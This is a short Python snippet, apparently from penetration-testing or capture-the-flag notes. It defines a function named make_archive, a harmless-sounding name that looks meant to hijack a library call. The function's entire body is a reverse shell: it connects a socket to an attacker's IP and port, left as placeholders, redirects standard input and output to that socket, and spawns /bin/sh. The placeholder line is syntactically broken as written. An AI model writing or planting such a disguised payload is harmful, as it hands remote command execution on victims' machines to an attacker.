# Python Module example

def make_archive(a, b, c):
  import sys,socket,os,pty;s=socket.socket()
  s.connect((##Put Your IP, ##Put listening port)))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")
